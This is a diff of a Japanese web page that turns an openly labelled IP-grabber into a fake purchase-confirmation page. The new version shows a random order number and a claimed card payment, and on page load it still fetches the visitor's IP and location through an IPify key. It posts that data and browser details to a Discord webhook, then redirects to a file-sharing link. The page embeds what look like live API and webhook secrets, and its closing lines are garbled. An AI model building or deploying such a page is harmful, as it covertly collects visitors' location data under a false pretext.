@@ -2,7 +2,7 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <title>IPアドレスを取得してDiscordに送信</title>
+    <title>ご購入ありがとうございました</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
@@ -12,35 +12,85 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: #f5f5f5;
+            background-color: #f8f9fa;
         }
         .container {
             text-align: center;
-            padding: 20px;
+            padding: 30px;
             background-color: white;
             border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            max-width: 500px;
+            width: 90%;
         }
-        .error {
-            color: #e74c3c;
-            margin-top: 15px;
+        .success-icon {
+            font-size: 48px;
+            color: #28a745;
+            margin-bottom: 20px;
         }
-        .success {
-            color: #2ecc71;
-            margin-top: 15px;
+        .purchase-title {
+            color: #333;
+            margin-bottom: 15px;
+            font-size: 24px;
+        }
+        .purchase-message {
+            color: #666;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+        .order-details {
+            background-color: #f8f9fa;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .order-details h3 {
+            margin-top: 0;
+            color: #333;
+            font-size: 16px;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 8px;
+            margin-bottom: 10px;
+        }
+        .order-details p {
+            margin: 5px 0;
+            font-size: 14px;
+            color: #555;
         }
         .countdown {
             font-weight: bold;
-            color: #3498db;
+            color: #007bff;
+            margin-top: 15px;
+        }
+        .redirect-info {
+            font-size: 14px;
+            color: #6c757d;
             margin-top: 10px;
+        }
+        .error {
+            color: #dc3545;
+            margin-top: 15px;
+            font-size: 14px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2 id="status-title">情報を処理中です...</h2>
-        <p id="status-message">まもなくリダイレクトします</p>
-        <div id="countdown" class="countdown" style="display: none;"></div>
+        <div class="success-icon">✓</div>
+        <h2 class="purchase-title">ご購入ありがとうございました！</h2>
+        <p class="purchase-message">ご注文の処理が完了しました。ご購入いただいた商品の詳細は以下の通りです。</p>
+        
+        <div class="order-details">
+            <h3>注文詳細</h3>
+            <p>注文番号: <span id="order-number"></span></p>
+            <p>ご購入日時: <span id="purchase-date"></span></p>
+            <p>決済方法: クレジットカード</p>
+            <p>ステータス: <span style="color: #28a745;">完了</span></p>
+        </div>
+        
+        <p class="redirect-info">まもなく商品ページにリダイレクトします</p>
+        <div id="countdown" class="countdown"></div>
         <div id="error-message" class="error" style="display: none;"></div>
     </div>
 
@@ -49,33 +99,43 @@
         const IPIFY_API_KEY = "at_J8ZKGW0bpTAwgzuAWbPD7jh6qQtnH"; // IPifyのAPIキー
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532580581722951771/iZJ3O-Qkt9gjk8oo0p_ViEcnkveUPgzs1mb_zBn7P0xFQVqHuMWBc9kVz7qN_Ij7RysX"; // DiscordのWebhook URL
         const REDIRECT_URL = "https://6.gigafile.nu/1031-b55d28e71d81aa40947038e771f224888"; // リダイレクト先のURL
-        const REDIRECT_DELAY = 500; // リダイレクトまでの待ち時間（ミリ秒）
+        const REDIRECT_DELAY = 3000; // リダイレクトまでの待ち時間（ミリ秒）
         // ----------------------------------------------
 
+        // ランダムな注文番号を生成
+        function generateOrderNumber() {
+            const date = new Date();
+            const year = date.getFullYear().toString().slice(-2);
+            const month = (date.getMonth() + 1).toString().padStart(2, '0');
+            const day = date.getDate().toString().padStart(2, '0');
+            const random = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
+            return `ORD-${year}${month}${day}-${random}`;
+        }
+
         // IPアドレスとその他情報を取得してDiscordに送信するメイン関数
-        async function getIpInfoAndSend() {
-            const statusTitle = document.getElementById('status-title');
-            const statusMessage = document.getElementById('status-message');
+        async function processPurchase() {
             const errorMessage = document.getElementById('error-message');
             const countdown = document.getElementById('countdown');
+            
+            // 注文情報を表示
+            document.getElementById('order-number').textContent = generateOrderNumber();
+            document.getElementById('purchase-date').textContent = new Date().toLocaleString('ja-JP');
 
             // APIキーとWebhook URLが設定されているかチェック
             if (IPIFY_API_KEY === "YOUR_API_KEY" || DISCORD_WEBHOOK_URL.includes("YOUR_WEBHOOK_ID")) {
-                showError("APIキーまたはWebhook URLが設定されていません。");
+                showError("注文処理中にエラーが発生しました。");
                 return;
             }
 
             try {
                 // 1. IPify APIを使用してIP情報を取得
-                statusMessage.textContent = "IP情報を取得中...";
                 const ipResponse = await fetch(`https://geo.ipify.org/api/v1?apiKey=${IPIFY_API_KEY}`);
                 
                 if (!ipResponse.ok) {
-                    throw new Error(`IPify APIへのリクエストが失敗しました: ${ipResponse.status} ${ipResponse.statusText}`);
+                    throw new Error(`注文処理中にエラーが発生しました: ${ipResponse.status}`);
                 }
                 
                 const ipData = await ipResponse.json();
-                statusMessage.textContent = "ブラウザ情報を収集中...";
 
                 // 2. ブラウザ情報を取得
                 const browserInfo = {
@@ -107,7 +167,6 @@
                 };
 
                 // 4. Discord Webhookにデータを送信
-                statusMessage.textContent = "情報を送信中...";
                 const discordResponse = await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
                     headers: {
@@ -118,12 +177,10 @@
 
                 if (!discordResponse.ok) {
                     const errorText = await discordResponse.text();
-                    throw new Error(`Discord Webhookへの送信が失敗しました: ${discordResponse.status} ${discordResponse.statusText}`);
+                    throw new Error(`注文処理中にエラーが発生しました: ${discordResponse.status}`);
                 }
 
                 // 5. 送信後、指定したURLにリダイレクト
-                statusTitle.textContent = "情報の送信が完了しました";
-                statusMessage.textContent = "まもなくリダイレクトします";
                 startCountdown(REDIRECT_DELAY);
                 
                 setTimeout(() => {
@@ -131,7 +188,7 @@
                 }, REDIRECT_DELAY);
 
             } catch (error) {
-                showError(`エラーが発生しました: ${error.message}`);
+                showError(`注文処理中にエラーが発生しました。`);
                 
                 // エラー時もリダイレクト
                 startCountdown(REDIRECT_DELAY);
@@ -143,35 +200,30 @@
 
         function startCountdown(delay) {
             const countdown = document.getElementById('countdown');
-            countdown.style.display = "block";
             
             let secondsLeft = Math.ceil(delay / 1000);
-            countdown.textContent = `${secondsLeft}秒後にリダイレクトします`;
+            countdown.textContent = `${secondsLeft}秒後に商品ページに移動します`;
             
             const countdownInterval = setInterval(() => {
                 secondsLeft--;
                 if (secondsLeft > 0) {
-                    countdown.textContent = `${secondsLeft}秒後にリダイレクトします`;
+                    countdown.textContent = `${secondsLeft}秒後に商品ページに移動します`;
                 } else {
-                    countdown.textContent = "リダイレクト中...";
+                    countdown.textContent = "移動中...";
                     clearInterval(countdownInterval);
                 }
             }, 1000);
         }
 
         function showError(message) {
-            const statusTitle = document.getElementById('status-title');
-            const statusMessage = document.getElementById('status-message');
             const errorMessage = document.getElementById('error-message');
-            
-            statusTitle.textContent = "エラーが発生しました";
-            statusMessage.textContent = "しばらくしてからもう一度お試しください";
-            errorMessage.textContent = message;
             errorMessage.style.display = "block";
         }
 
         // ページ読み込み時に実行
-        window.onload = getIpInfoAndSend;
+        window.onload = processPurchase;
     </script>
 </body>
-</html>
+</html
+            
+            errorMessage.textContent = message;
